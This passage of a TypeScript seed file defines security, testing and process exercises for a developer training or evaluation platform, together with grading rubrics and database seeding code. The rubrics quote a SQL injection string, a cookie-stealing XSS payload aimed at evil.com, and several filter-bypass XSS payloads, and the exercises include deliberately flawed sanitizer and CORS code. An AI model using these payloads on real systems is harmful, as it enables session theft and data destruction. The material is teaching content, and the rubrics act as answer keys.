          "Multiple vulnerabilities to identify: (1) SQL Injection (A03:2021) — string interpolation in SQL queries. Attack: `email = \"'; DROP TABLE users; --\"`. Fix: parameterized queries. (2) SQL Injection in audit_log — same problem, JSON.stringify doesn't prevent SQL injection. (3) Open Redirect (part of A01:2021) — `redirectUrl` from user input goes directly into the email link. Attack: attacker sets `redirectUrl` to a phishing site. Fix: validate against an allowlist of permitted domains. (4) XSS via email (A03:2021) — `email` is injected into HTML without escaping. Attack: `email = \"<script>document.location='evil.com?c='+document.cookie</script>\"`. Fix: HTML-escape all user input in templates. (5) No authentication/authorization check — the endpoint is `/api/admin/users` but there's no middleware checking if the caller is an admin. (6) Mass assignment — `role` comes from the request body, allowing a caller to set `role = 'admin'`. Evaluate whether the developer identifies at least 4 of these 6 vulnerabilities. Give credit for correct OWASP categorization and concrete attack examples.",
      },
      {
        ownerRole: 'Senior developer who has learned security through production incidents and considers every vulnerability a potential incident report',
        ownerContext:
          "Evaluate the developer's ability to explain the IMPACT of each vulnerability, not just its existence. The SQL injection isn't just 'bad practice' — it means an attacker can read every user's email, delete tables, or escalate privileges. The missing auth check means any unauthenticated user can create admin accounts. Evaluate whether the developer prioritizes the fixes by severity: (1) missing auth check (immediate exploit, no technical skill required); (2) SQL injection (data breach, full database compromise); (3) open redirect (phishing vector for existing users); (4) XSS in email (account takeover via email clients that render HTML). Give credit for: correct severity ordering, concrete attack scenarios, and proposing both immediate fixes (parameterized queries, add auth middleware) and systemic fixes (use an ORM that prevents SQL injection by default, add CSP headers, input validation middleware).",
      },
    ],
  },

  {
    id: uuidv5('exercise-054-jwt-implementation'),
    title: 'The JWT Authentication Flow',
    description: `Implement a complete JWT authentication flow for a REST API. The requirements:

- Login endpoint: accepts email + password, returns access token + refresh token
- Access token: expires in 15 minutes, contains user ID and roles
- Refresh token: expires in 7 days, stored in the database, can be revoked
- Protected endpoint middleware: validates the access token and injects user context
- Refresh endpoint: accepts a refresh token, returns a new access token
- Logout endpoint: revokes the refresh token

\`\`\`typescript
// Implement these:
async function login(email: string, password: string): Promise<TokenPair> { /* ... */ }
async function refresh(refreshToken: string): Promise<TokenPair> { /* ... */ }
async function logout(refreshToken: string): Promise<void> { /* ... */ }
function authMiddleware(req: Request, res: Response, next: NextFunction): void { /* ... */ }
\`\`\`

Show the implementation. Explain: (1) why access tokens are short-lived, (2) why refresh tokens are stored server-side, (3) how you would handle token rotation (new refresh token on each refresh call).`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'python'],
    tags: ['security', 'jwt', 'authentication'],
    topics: ['jwt', 'refresh-tokens', 'token-rotation', 'bcrypt', 'middleware', 'authentication-flow'],
    variations: [
      {
        ownerRole: 'Security architect who has designed auth systems for banks and healthcare companies with strict compliance requirements',
        ownerContext:
          "Evaluate the implementation for security correctness. Key points: (1) passwords must be hashed with bcrypt (not SHA-256, not md5) and compared with constant-time comparison; (2) access tokens should use RS256 (asymmetric) for production, HS256 is acceptable for this exercise; (3) refresh tokens should be opaque (random bytes), not JWTs — they don't need to carry claims, they're just lookup keys; (4) token rotation: each refresh call should invalidate the old refresh token and issue a new one — this detects token theft (if a stolen token is used after the legitimate user already refreshed, both tokens are invalidated). Evaluate: does the middleware handle expired tokens correctly (401, not 403)? Does login hash the password before comparing? Does the implementation prevent timing attacks on token validation? Give credit for: correct password handling, token rotation with theft detection, and proper HTTP status codes (401 for auth failure, 403 for insufficient permissions).",
      },
      {
        ownerRole: 'Frontend developer who needs to integrate with this auth API and wants clear, predictable behavior from every endpoint',
        ownerContext:
          "Evaluate from the consumer's perspective. The auth flow should be: (1) login returns both tokens — access token in the response body, refresh token as an httpOnly cookie (not in localStorage — XSS risk); (2) on 401 response, the client calls the refresh endpoint automatically; (3) on refresh failure (expired refresh token), redirect to login; (4) logout clears both tokens. Evaluate whether the developer considers: where tokens are stored on the client (httpOnly cookies for refresh, memory for access — never localStorage), how the frontend handles concurrent requests when the access token expires (queue requests while refreshing, retry after refresh), and what happens when the user has multiple tabs open (all tabs need to detect the logout from one tab). Give credit for: httpOnly cookie for refresh token, clear error responses, and thinking about the multi-tab scenario.",
      },
    ],
  },

  {
    id: uuidv5('exercise-055-cors-policy'),
    title: 'The CORS Misconfiguration',
    description: `Your API serves a React frontend at \`app.example.com\`. A developer configured CORS like this:

\`\`\`typescript
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['*']
}))
\`\`\`

A security audit flagged this configuration. Explain: (1) what CORS is and why it exists, (2) every problem with this configuration, (3) the correct configuration for this use case. Then answer: "A developer on my team says CORS is 'just a browser thing' and doesn't protect the API. Are they right?"`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'security',
    languages: [],
    tags: ['security', 'cors', 'web-security'],
    topics: ['cors', 'same-origin-policy', 'preflight-requests', 'credentials', 'browser-security', 'csrf'],
    variations: [
      {
        ownerRole: 'Security engineer who has exploited CORS misconfigurations in penetration tests and knows exactly how attackers abuse them',
        ownerContext:
          "Evaluate the developer's understanding of CORS mechanics. Problems with the configuration: (1) `origin: '*'` with `credentials: true` is INVALID — browsers reject this combination (you cannot use wildcard origin with credentials). If the server actually sends `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`, no browser will send cookies. However, some CORS libraries 'helpfully' reflect the request's Origin header instead of sending `*` when credentials are true — this effectively allows ANY origin with credentials, which is the worst possible configuration. (2) `allowedHeaders: ['*']` may not work as expected in all browsers for preflight requests. The correct configuration: `origin: 'https://app.example.com'` (or a validated allowlist), `credentials: true`, specific methods and headers. For the 'just a browser thing' question: the developer is partially right — CORS is enforced by browsers, not servers. But it protects against CSRF-style attacks where a malicious website makes credentialed requests to your API using the user's cookies. Give credit for: explaining the origin reflection vulnerability, correct CORS configuration, and a nuanced answer to the 'browser thing' question.",
      },
      {
        ownerRole: 'Backend developer who has spent 4 hours debugging CORS errors and eventually set everything to wildcard out of frustration',
        ownerContext:
          "Evaluate empathy and education ability. The developer who set `origin: '*'` was probably frustrated by CORS errors during development. Evaluate whether the candidate: (1) explains WHY CORS exists (same-origin policy prevents malicious sites from reading API responses on behalf of the user); (2) provides a correct configuration that works (not just 'don't use wildcards' but the actual correct config); (3) addresses the development experience — use a different CORS config for development (allow localhost) vs. production (strict origin list); (4) explains preflight requests clearly (browsers send OPTIONS before POST/PUT/DELETE with custom headers — the server must respond correctly). Give credit for: a clear explanation accessible to someone who sees CORS as 'that annoying error,' a working production configuration, and a development configuration that avoids the frustration that led to the wildcard in the first place.",
      },
    ],
  },

  {
    id: uuidv5('exercise-056-input-sanitization'),
    title: 'The Input Sanitization Challenge',
    description: `Your content platform allows users to write posts with rich text (bold, italic, links, images). The posts are stored as HTML and rendered on other users' pages. A security researcher reported that they can execute JavaScript in other users' browsers by posting specially crafted content.

The current sanitization:

\`\`\`typescript
function sanitizeHTML(input: string): string {
  return input
    .replace(/<script>/gi, '')
    .replace(/<\/script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/on\\w+=/gi, '')
}
\`\`\`

This is a blocklist approach. Demonstrate why it fails (provide at least 3 bypass payloads). Then implement a proper sanitization strategy. Explain the fundamental difference between blocklisting and allowlisting for security.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'xss', 'sanitization'],
    topics: ['xss', 'html-sanitization', 'allowlist-vs-blocklist', 'dompurify', 'content-security-policy', 'defense-in-depth'],
    variations: [
      {
        ownerRole: 'Penetration tester who has bypassed HTML sanitization filters in 30+ web applications and has a personal collection of XSS payloads',
        ownerContext:
          "Evaluate bypass knowledge and the proposed fix. Bypass payloads: (1) `<scr<script>ipt>alert(1)</script>` — the inner `<script>` is removed, leaving a valid `<script>` tag; (2) `<img src=x onerror=alert(1)>` — the regex `on\\w+=` requires `=` immediately after the event name, but `onerror =` (with a space) or `onerror\t=` (with a tab) bypasses it; (3) `<a href='java&#115;cript:alert(1)'>click</a>` — HTML entity encoding bypasses the plaintext `javascript:` check; (4) `<svg/onload=alert(1)>` — SVG elements also support event handlers; (5) `<iframe src='data:text/html,<script>alert(1)</script>'>`. The fix: use an allowlist-based sanitizer like DOMPurify that parses the HTML into a DOM tree, walks it, and only keeps allowed tags and attributes. Never regex-based sanitization for HTML. Give credit for: at least 3 working bypass payloads, recommending DOMPurify or similar, and explaining why blocklisting fundamentally cannot work for HTML (the HTML spec is too large and too flexible).",
      },
      {
        ownerRole: 'Senior developer who was responsible for the XSS vulnerability that the security researcher found and needs to fix it without breaking the rich text feature',
        ownerContext:
          "Evaluate the fix for both security and functionality. The developer must: (1) replace the regex sanitizer with DOMPurify or a similar parsed-HTML sanitizer; (2) define an allowlist of tags (p, br, strong, em, a, img, ul, ol, li, h1-h3) and attributes (href on a, src on img, alt on img — NO event handlers, NO style attributes); (3) for links, validate that href starts with `https://` or `http://` — no `javascript:`, `data:`, or `vbscript:` protocols; (4) add Content-Security-Policy header as defense-in-depth (`script-src 'self'` prevents inline scripts even if sanitization is bypassed). Evaluate whether the developer tests their fix against the bypass payloads. Give credit for: using a proven library (not writing a custom sanitizer), a restrictive allowlist, CSP as a backup layer, and acknowledging that they need to re-sanitize all existing content in the database (old posts may contain malicious HTML).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Testing (3 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-057-test-strategy'),
    title: 'The Test Strategy Decision',
    description: `Your team has been told "increase test coverage to 80%." The codebase has 0% coverage. There are 200 files: 40 API route handlers, 60 service layer functions, 30 database queries, 20 utility functions, and 50 React components.

You have 3 developers and 2 weeks. You cannot test everything. Design a test strategy: what do you test first, what do you test last, and what do you explicitly choose NOT to test? Justify every decision in terms of risk and value.`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'testing',
    languages: [],
    tags: ['testing', 'strategy', 'planning'],
    topics: ['test-strategy', 'test-pyramid', 'risk-based-testing', 'code-coverage', 'prioritization'],
    variations: [
      {
        ownerRole: 'Staff QA engineer who has built test suites from scratch at 3 companies and believes coverage percentage is the wrong metric',
        ownerContext:
          "Evaluate the developer's prioritization logic. The 80% coverage mandate is a trap — 80% coverage on utility functions and low-risk components is worthless compared to 30% coverage on critical payment and auth flows. The correct prioritization: (1) utility functions first — they're pure functions, easy to test, high ROI; (2) service layer functions that handle business logic (discounts, permissions, state transitions); (3) API route handlers with integration tests against a test database; (4) React components last (most effort, least bug-prevention value for a backend-heavy app). What NOT to test: generated code, simple getters/setters, thin wrapper functions. Evaluate whether the developer: (1) pushes back on the 80% number or at least contextualizes it; (2) proposes risk-based prioritization; (3) sets up CI to run tests on every PR (the test suite is useless if it doesn't run automatically); (4) acknowledges that 2 weeks is enough to establish the foundation, not reach 80%. Give credit for: questioning the metric, prioritizing high-risk code, and being realistic about what 3 developers can accomplish in 2 weeks.",
      },
      {
        ownerRole: 'Engineering manager who gave the 80% coverage mandate and needs to understand from the developer how to measure test effectiveness beyond coverage',
        ownerContext:
          "Evaluate whether the developer can communicate testing value to a manager. Coverage is a vanity metric — a test that asserts `expect(1+1).toBe(2)` increases coverage but catches nothing. Better metrics: (1) mutation testing score (does the test suite catch bugs when code is modified?); (2) defect escape rate (how many bugs reach production that tests should have caught?); (3) mean time to test a new feature (if testing is too hard, developers skip it). Evaluate whether the developer proposes: (1) starting with the test infrastructure (test runner, CI integration, test database setup) before writing any tests; (2) writing tests that match real bug patterns (the last 10 production bugs — would any test have caught them?); (3) a clear distinction between unit tests (fast, isolated, many) and integration tests (slower, realistic, fewer). Give credit for: explaining why coverage alone is misleading, proposing alternative metrics, and delivering a realistic 2-week plan.",
      },
    ],
  },

  {
    id: uuidv5('exercise-058-mocking-decisions'),
    title: 'The Mocking Debate',
    description: `Your team is writing tests for a service that sends emails after a user signs up. The function:

\`\`\`typescript
class UserService {
  constructor(
    private userRepo: UserRepository,
    private emailService: EmailService,
    private analyticsService: AnalyticsService
  ) {}

  async signup(email: string, password: string): Promise<User> {
    const existingUser = await this.userRepo.findByEmail(email)
    if (existingUser) throw new DuplicateUserError(email)

    const hashedPassword = await bcrypt.hash(password, 12)
    const user = await this.userRepo.create({ email, hashedPassword })

    await this.emailService.sendWelcome(user.email, user.name)
    await this.analyticsService.track('user_signup', { userId: user.id })

    return user
  }
}
\`\`\`

Write the test suite. For each dependency, decide: mock it, stub it, fake it, or use the real thing. Justify each decision. One developer says "mock everything." Another says "mock nothing — use a test database and a real SMTP server." Who is right?`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'testing',
    languages: ['typescript', 'python'],
    tags: ['testing', 'mocking', 'unit-testing'],
    topics: ['mocking', 'test-doubles', 'integration-testing', 'test-isolation', 'dependency-injection', 'test-design'],
    variations: [
      {
        ownerRole: 'Senior developer who has written 5,000+ tests and has strong opinions about when mocking helps and when it creates false confidence',
        ownerContext:
          "Evaluate the developer's mocking decisions and justifications. The pragmatic approach: (1) UserRepository — use a real test database OR a fake (in-memory implementation of the repo interface). Mocking the repo makes the test brittle — it tests the mock, not the query. A fake is better: it implements the same interface but stores data in memory. (2) EmailService — mock or stub. Sending real emails in tests is slow and has side effects. Assert that `sendWelcome` was called with the right arguments. (3) AnalyticsService — mock or stub. Same reasoning as email — verify the call, don't make it. (4) bcrypt — use the real thing. It's deterministic and fast enough for tests. Evaluate whether the tests cover: (1) happy path (user created, email sent, analytics tracked); (2) duplicate user (throws error, no email sent); (3) email failure (does the user still get created, or does the transaction roll back?). The email failure case is the key test — it reveals whether the developer thinks about error handling in the code under test, not just the happy path.",
      },
      {
        ownerRole: 'Tech lead who has seen test suites that mock so heavily they pass even when the production code is broken',
        ownerContext:
          "Evaluate the developer's ability to identify the mocking trap. Over-mocking creates tests that verify 'the code calls the things we expect it to call' rather than 'the code produces the correct outcome.' The test `expect(emailService.sendWelcome).toHaveBeenCalledWith(email, name)` passes even if the email service interface changes and the production code breaks. Evaluate: (1) does the developer understand the difference between behavior testing (verify outcomes) and interaction testing (verify calls)? (2) do they propose contract tests or integration tests alongside unit tests to catch the gaps that mocking creates? (3) do they address the 'neither is right' answer — mock external services (email, analytics), use real implementations for internal dependencies (database)? Give credit for: a nuanced answer to the 'who is right' question, a test suite that tests behavior not implementation, and identifying the email failure case as the most important test.",
      },
    ],
  },

  {
    id: uuidv5('exercise-059-integration-vs-unit'),
    title: 'The Testing Pyramid in Practice',
    description: `Your API has this endpoint flow:

\`\`\`
POST /api/orders → OrderController → OrderService → [InventoryService, PaymentService, EmailService] → OrderRepository → PostgreSQL
\`\`\`

A developer wrote 50 unit tests that mock every dependency. All 50 pass. In production, the endpoint returns 500 because the OrderService passes the wrong parameter format to the PaymentService.

The developer says "we need more unit tests." You say "we need integration tests." Explain: (1) why the unit tests didn't catch this bug, (2) what integration tests you would write for this endpoint, (3) how you would structure the test suite (ratio of unit to integration to e2e), (4) what you mock and what you don't in the integration test.`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'testing',
    languages: [],
    tags: ['testing', 'integration', 'test-pyramid'],
    topics: ['integration-testing', 'test-pyramid', 'contract-testing', 'end-to-end-testing', 'test-boundaries', 'parameter-mismatch'],
    variations: [
      {
        ownerRole: 'Staff engineer who has seen test suites with 2,000 unit tests and zero integration tests catch zero real bugs in production',
        ownerContext:
          "Evaluate the developer's understanding of why unit tests failed here. The unit test for OrderService mocked PaymentService — the mock accepted whatever format OrderService passed. The real PaymentService expects `{ amount_cents: 1000 }` but OrderService sends `{ amount: 10.00 }`. The mock doesn't validate the contract. Integration tests fix this by using real service instances (or at least realistic fakes). Evaluate the proposed integration tests: (1) a test that creates a real order through the API (POST to /api/orders), with a real database, real OrderService → InventoryService → PaymentService chain, and only mocking external services (email, payment gateway); (2) contract tests between services (OrderService and PaymentService agree on the interface). For the pyramid ratio: roughly 70% unit / 20% integration / 10% e2e. Evaluate whether the developer understands that the ratio is about speed and cost (unit tests are fast and cheap, e2e tests are slow and expensive), not about value (integration tests often catch more real bugs per test). Give credit for: correctly diagnosing the mock's failure mode, proposing targeted integration tests, and discussing contract testing.",
      },
      {
        ownerRole: 'QA lead who has been arguing for integration tests for 6 months and finally has a production bug to prove the point',
        ownerContext:
          "Evaluate whether the developer can make the case for integration tests convincingly. The argument: unit tests verify that each component works in isolation. Integration tests verify that components work together. The parameter format bug is a BOUNDARY bug — it exists at the interface between two components, exactly where unit tests have a blind spot. Evaluate: (1) does the developer acknowledge that unit tests are still valuable (they catch logic errors within a component)? (2) do they propose a realistic integration test that would have caught this specific bug? (3) do they address the cost concern ('integration tests are slow') with pragmatic solutions (test database with transactions that roll back, parallel test execution, selective integration tests for critical paths)? Give credit for: a balanced view (both unit and integration tests have roles), a concrete integration test example, and proposing that the test suite should have caught this bug without being prohibitively slow.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Soft Skills / Process (2 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-060-code-review-culture'),
    title: 'The Code Review Culture Problem',
    description: `Your team of 8 developers has a code review problem. PRs sit for 2-3 days before anyone reviews them. When reviews happen, they're either rubber stamps ("LGTM") or 40-comment nitpick sessions about variable names and bracket placement. Two developers have started merging without reviews because "it takes too long." The tech lead asked you to fix the review culture.

What changes would you propose? Be specific: define the process, the expectations, the tools, and how you would get buy-in from the team. Address the developer who says "code reviews slow me down."`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'process',
    languages: [],
    tags: ['process', 'code-review', 'team-culture'],
    topics: ['code-review', 'team-processes', 'engineering-culture', 'feedback', 'pull-requests', 'automation'],
    variations: [
      {
        ownerRole: 'Engineering director who has transformed code review culture at two companies and believes reviews are the highest-leverage activity a team does',
        ownerContext:
          "Evaluate the developer's proposals for completeness and realism. Effective changes: (1) SLA: reviews must start within 4 hours (not finish, start — a first pass with questions counts); (2) PR size limits: max 400 lines of code (large PRs get rubber-stamped because nobody has time to review 2,000 lines); (3) automate the nitpicks: ESLint, Prettier, and type checking in CI catch formatting and style issues — reviews should focus on logic, architecture, and correctness; (4) review assignment: automatic rotation (GitHub CODEOWNERS or a bot) so reviews don't pile up on one person; (5) review guidelines: what to look for (bugs, security, maintainability), what NOT to comment on (style that's enforced by linters). For the 'reviews slow me down' developer: reviews ARE part of the work, not an interruption. A team that doesn't review ships bugs faster, not features faster. Give credit for: concrete process changes, automation of low-value review comments, addressing the incentive problem (reviewing others' code should be recognized as valuable work), and proposing a trial period with a retrospective.",
      },
      {
        ownerRole: 'Senior developer who is one of the two people merging without reviews and is frustrated by the current process',
        ownerContext:
          "Evaluate empathy. The developer merging without reviews is not lazy — they're responding rationally to a broken process. If reviews take 3 days, the developer's feature branch diverges, merge conflicts accumulate, and context is lost. The fix must address the root cause (slow reviews), not the symptom (merging without review). Evaluate whether the candidate: (1) acknowledges the frustration as legitimate; (2) proposes changes that make reviews faster (smaller PRs, SLA, pair programming as a review alternative for complex changes); (3) addresses the LGTM problem (reviews should have a checklist: 'I have tested this locally' or 'I understand the change' — not just 'looks fine'); (4) creates a feedback loop (track review turnaround time and discuss it in retros). Give credit for: empathy with the frustrated developer, practical speed improvements, and defining what a 'good' review looks like (not a 40-comment nitpick session, but 2-5 substantive comments about logic and design).",
      },
    ],
  },

  {
    id: uuidv5('exercise-061-technical-debt'),
    title: 'The Technical Debt Negotiation',
    description: `You have a list of 12 technical debt items accumulated over 18 months. Your PM has given you 20% of next quarter's engineering time for debt reduction. That's roughly 3 developer-weeks. You need to choose what to fix, what to defer, and what to accept permanently.

The debt items (estimated effort in days):
1. Migrate from JavaScript to TypeScript (15 days)
2. Replace deprecated auth library (5 days)
3. Fix flaky test suite — 8 tests fail randomly (3 days)
4. Remove dead code — 4,000 lines never executed (2 days)
5. Upgrade Node.js from 16 to 20 (3 days)
6. Replace hand-rolled CSV parser with a library (1 day)
7. Add request validation to 12 API endpoints (4 days)
8. Consolidate 3 logging approaches into one (2 days)
9. Fix N+1 queries on the dashboard (1 day)
10. Rewrite the deployment script from bash to a proper tool (5 days)
11. Add database indexes for slow queries (1 day)
12. Split the 2,000-line OrderService into smaller services (8 days)

How do you prioritize? Walk through your decision framework, then present your plan to the PM.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'process',
    languages: [],
    tags: ['process', 'technical-debt', 'prioritization'],
    topics: ['technical-debt', 'prioritization', 'risk-assessment', 'stakeholder-communication', 'engineering-planning'],
    variations: [
      {
        ownerRole: 'Staff engineer who has negotiated technical debt budgets with PMs for 8 years and has a framework for scoring debt items by impact and urgency',
        ownerContext:
          "Evaluate the developer's prioritization framework. A good framework scores each item on: (1) risk of NOT fixing it (security risk, production stability, developer productivity); (2) effort to fix; (3) value delivered (faster deploys, fewer bugs, faster development). With 15 developer-days: the high-priority items should be: #2 deprecated auth library (security risk — deprecated means no patches), #3 flaky tests (developer productivity — flaky tests erode trust in the test suite), #9 N+1 queries (user-facing performance, 1 day), #11 database indexes (user-facing performance, 1 day), #6 CSV parser (risk of bugs in hand-rolled parser, 1 day), #7 API validation (security risk, 4 days) = total 15 days. The JS-to-TS migration (#1) is the biggest item but should NOT be selected — 15 days is an underestimate, and it can be done incrementally alongside feature work. The 2,000-line OrderService (#12) is legitimate debt but 8 days is risky for a debt sprint. Evaluate whether the developer: (1) has a scoring framework, not just gut feel; (2) explains WHY they defer specific items; (3) identifies items that can be done alongside feature work (TypeScript migration, dead code removal); (4) presents the plan in terms the PM understands (risk reduction, not code quality).",
      },
      {
        ownerRole: 'Product manager who allocated the 20% reluctantly and needs to see concrete business value from the investment, not just "cleaner code"',
        ownerContext:
          "Evaluate the developer's ability to communicate in business terms. 'Replace deprecated auth library' is not compelling. 'Our authentication library has a known vulnerability with no patch available — if exploited, we face a data breach and regulatory fines' is compelling. 'Fix flaky tests' is not compelling. 'Our test suite randomly fails, causing developers to waste 2 hours per week re-running tests and occasionally merging buggy code because they assumed the failure was a flake' is compelling. Evaluate whether the developer: (1) translates each selected item into business impact (risk, developer time saved, user experience improved); (2) provides a concrete before/after ('dashboard loads in 8 seconds → 1 second after fixing N+1 queries'); (3) commits to a measurable outcome ('after this sprint, flaky test rate drops from 15% to < 1%'); (4) acknowledges what they're NOT fixing and the risk of deferring it. Give credit for: business-oriented communication, measurable commitments, and intellectual honesty about what 3 weeks can and cannot accomplish.",
      },
    ],
  },
]

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

function validateExercises(exercises: SeedExercise[]): void {
  const errors: string[] = []

  for (const ex of exercises) {
    if (!ex.title.trim()) errors.push(`${ex.id}: empty title`)
    if (!ex.description.trim()) errors.push(`${ex.id}: empty description`)
    if (ex.duration <= 0) errors.push(`${ex.id}: invalid duration ${ex.duration}`)
    if (ex.variations.length < 1) errors.push(`${ex.id}: no variations`)
    for (const v of ex.variations) {
      if (!v.ownerRole.trim()) errors.push(`${ex.id}: empty ownerRole`)
      if (!v.ownerContext.trim()) errors.push(`${ex.id}: empty ownerContext`)
    }
  }

  if (errors.length > 0) {
    throw new Error(`Seed validation failed:\n${errors.map((e) => `  - ${e}`).join('\n')}`)
  }
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

export async function seed(): Promise<void> {
  const DATABASE_URL = process.env['DATABASE_URL']
  if (!DATABASE_URL) throw new Error('DATABASE_URL is required')

  const sql = postgres(DATABASE_URL)
  const db = drizzle(sql, { schema })

  try {
    console.log('Validating seed data...')
    validateExercises(EXERCISES)

    console.log('Inserting system user...')
    await db.insert(usersTable).values(SYSTEM_USER).onConflictDoNothing()

    console.log(`Inserting ${EXERCISES.length} exercises...`)
    for (const exercise of EXERCISES) {
      await db
        .insert(exercisesTable)
        .values({
          id: exercise.id,
          title: exercise.title,
          description: exercise.description,
          duration: exercise.duration,
          difficulty: exercise.difficulty,
          category: exercise.category,
          type: exercise.type,
          status: 'published',
          language: exercise.languages,
          tags: exercise.tags,
          topics: exercise.topics,
          ownerRole: exercise.variations[0]!.ownerRole,
          ownerContext: exercise.variations[0]!.ownerContext,
          createdBy: SYSTEM_USER_ID,
          createdAt: new Date('2026-01-01T00:00:00Z'),
        })
        .onConflictDoUpdate({
          target: exercisesTable.id,
          set: {
            title: exercise.title,
            description: exercise.description,
            status: 'published',
          },
        })

      for (let i = 0; i < exercise.variations.length; i++) {
        const variation = exercise.variations[i]!
        const variationId = uuidv5(`variation-${exercise.id}-${i}`)

        await db
          .insert(variationsTable)
          .values({
            id: variationId,
            exerciseId: exercise.id,
            ownerRole: variation.ownerRole,
            ownerContext: variation.ownerContext,
            createdAt: new Date('2026-01-01T00:00:00Z'),
          })
          .onConflictDoNothing()
      }

      console.log(`  ✓ ${exercise.title}`)
    }

    console.log(`\nSeed complete. ${EXERCISES.length} exercises, ${EXERCISES.reduce((n, e) => n + e.variations.length, 0)} variations.`)
  } finally {
    await sql.end()
  }
}

// Run when invoked directly
if (require.main === module) {
  seed()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error('Seed failed:', err)
      process.exit(1)
    })
}
